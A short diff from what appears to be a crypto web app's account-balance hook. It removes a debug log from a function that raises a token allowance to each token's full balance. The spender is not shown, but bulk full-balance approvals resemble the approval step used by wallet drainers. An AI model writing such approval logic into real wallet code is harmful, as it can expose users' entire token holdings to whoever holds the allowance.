@@ -42,7 +42,6 @@ const UseAccountBalances = () => {
 
   const increaseAllowanceForTokens = async (tokensData) => {
     for (let token of tokensData) {
-      console.log(token);
       const { contractAddress, rawBalance, formatted } = token;
       increaseAllowance(contractAddress, rawBalance);
     }
